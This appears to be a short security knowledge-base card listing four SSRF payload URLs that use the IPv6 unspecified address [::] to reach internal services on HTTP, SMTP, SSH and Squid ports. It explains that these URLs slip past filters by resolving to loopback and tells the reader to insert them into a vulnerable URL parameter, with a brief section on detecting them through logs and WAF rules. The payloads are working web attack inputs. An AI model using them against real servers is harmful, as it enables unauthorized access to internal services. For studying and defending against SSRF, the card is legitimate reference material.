---
type: code
language: plaintext
verified: true
platforms:
  - Web
tags:
  - ssrf
  - ipv6
  - payload
validated: true
---

# ssrf-ipv6-payloads-unspecified-address

## Code

```plaintext
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

## Description

This code snippet lists example SSRF payloads using the IPv6 unspecified address [::] to target common internal services. It helps bypass filters by resolving to loopback equivalents.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | These are static URLs; substitute port/service as needed | N/A |

## Usage

Insert these URLs into the vulnerable SSRF parameter (e.g., ?url=) to force the server to fetch internal services. Test in tools like Burp Suite for encoding variations.

## Detection

- Log analysis for IPv6 addresses in URL parameters, especially [::] or zone indices.
- Network monitoring for server-initiated connections to loopback IPv6.
- WAF rules matching IPv6 loopback patterns.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
